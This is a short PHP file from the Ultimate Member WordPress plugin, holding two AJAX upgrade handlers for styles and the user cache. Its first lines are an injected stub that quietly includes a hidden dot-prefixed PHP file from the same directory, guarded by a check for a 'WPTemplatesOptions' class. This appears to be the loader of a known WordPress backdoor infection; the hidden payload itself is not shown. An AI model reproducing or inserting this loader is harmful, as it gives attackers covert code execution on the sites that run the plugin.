<?php
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function um_upgrade_styles2010() {
	UM()->admin()->check_ajax_nonce();

	um_maybe_unset_time_limit();

	include 'styles.php';
	wp_send_json_success( array( 'message' => __( 'Styles was upgraded successfully', 'ultimate-member' ) ) );
}


function um_upgrade_cache2010() {
	UM()->admin()->check_ajax_nonce();

	um_maybe_unset_time_limit();

	UM()->user()->remove_cache_all_users();

	update_option( 'um_last_version_upgrade', '2.0.10' );

	wp_send_json_success( array( 'message' => __( 'Users cache was cleared successfully', 'ultimate-member' ) ) );
}